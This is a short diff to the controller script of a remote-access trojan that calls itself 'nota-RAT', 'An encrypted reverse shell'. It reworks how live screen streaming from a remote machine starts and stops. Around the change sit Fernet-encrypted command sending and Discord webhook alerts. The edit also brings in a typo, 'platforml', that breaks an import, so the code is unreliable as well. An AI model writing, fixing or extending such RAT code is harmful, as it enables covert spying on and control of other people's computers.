@@ -1,6 +1,5 @@
 import socket, argparse, subprocess, re, time, os, pyotp, maskpass, qrcode
-from sys import platform
-from vidstream import StreamingServer
+from sys import platforml
 from threading import Thread
 from PIL import Image
 from cryptography.fernet import Fernet
@@ -20,7 +19,7 @@ parser.add_argument(
 )
 
 
-
+n = 0
 hostname = socket.gethostname()
 IPAddr = socket.gethostbyname(hostname)
 args = parser.parse_args()
@@ -181,7 +180,8 @@ while True:
                 command = "/stoplive"
                 command = Fernet(key).encrypt(command.encode())
                 client_socket.send(command)
-                receiver.stop_server()
+                if n == 1:
+                    receiver.stop_server()
                 if args.discord:
                     webhook = DiscordWebhook(url=args.discord, content='@everyone')
                     embed = DiscordEmbed(title='nota-RAT', description='An encrypted reverse shell', color='03b2f8')
@@ -321,6 +321,8 @@ while True:
                 file_finish = Fernet(key).decrypt(file_finish).decode()
                 print(f"[{INFO}] {file_finish}\n")
         if command == "/getlive":
+            n = 1
+            from vidstream import StreamingServer
             server_location = client_socket.recv(BUFFER_SIZE)
             server_location = Fernet(key).decrypt(server_location).decode()
             if server_location == "no":
@@ -344,6 +346,7 @@ while True:
             print(f"[{IMPORTANT}] {server_state}")
             continue
         if command == "/stoplive":
+            n = 0
             receiver.stop_server()
             receiver = StreamingServer(IPAddr, 422)
             continue
@@ -368,7 +371,8 @@ while True:
             command = "/stoplive"
             command = Fernet(key).encrypt(command.encode())
             client_socket.send(command)
-            receiver.stop_server()
+            if n == 1:
+                receiver.stop_server()
             if args.discord:
                 webhook = DiscordWebhook(url=args.discord, content='@everyone')
                 embed = DiscordEmbed(title='nota-RAT', description='An encrypted reverse shell', color='03b2f8')
